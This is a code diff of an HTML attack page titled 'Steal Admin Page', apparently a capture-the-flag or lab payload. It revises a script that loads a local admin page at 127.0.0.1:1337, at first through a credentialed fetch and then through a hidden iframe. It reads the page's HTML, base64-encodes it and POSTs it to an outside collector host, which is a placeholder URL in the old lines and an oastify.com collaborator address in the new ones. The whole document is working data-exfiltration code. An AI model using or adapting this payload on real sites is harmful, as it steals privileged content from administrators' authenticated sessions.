@@ -2,30 +2,28 @@
 <html>
 <head><title>Steal Admin Page</title></head>
 <body>
+<iframe id="adminFrame" src="http://127.0.0.1:1337/admin" style="display:none"></iframe>
 <script>
-  (async () => {
+  const iframe = document.getElementById('adminFrame');
+  iframe.onload = () => {
     try {
-      // Visit the /admin page as the admin (same origin: 127.0.0.1:1337)
-      const adminResponse = await fetch("http://127.0.0.1:1337/admin", {
-        method: "GET",
-        credentials: "include"
-      });
+      // Access the iframe's document (same origin: localhost)
+      const adminDoc = iframe.contentDocument || iframe.contentWindow.document;
+      const htmlText = adminDoc.documentElement.outerHTML;
 
-      const htmlText = await adminResponse.text();
-
-      // Base64 encode the HTML
+      // Base64 encode
       const base64Html = btoa(unescape(encodeURIComponent(htmlText)));
 
-      // Send it to your collaborator URL
-      await fetch("https://your-collaborator-url.com/collect", {
+      // Send to collaborator
+      fetch("https://m8vnqd7dq1umgppcs5ki7c5xooufi96y.oastify.com/collect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ data: base64Html })
       });
-    } catch (err) {
-      console.error("Error exfiltrating admin page:", err);
+    } catch (e) {
+      console.error("Error accessing iframe content:", e);
     }
-  })();
+  };
 </script>
 </body>
 </html>
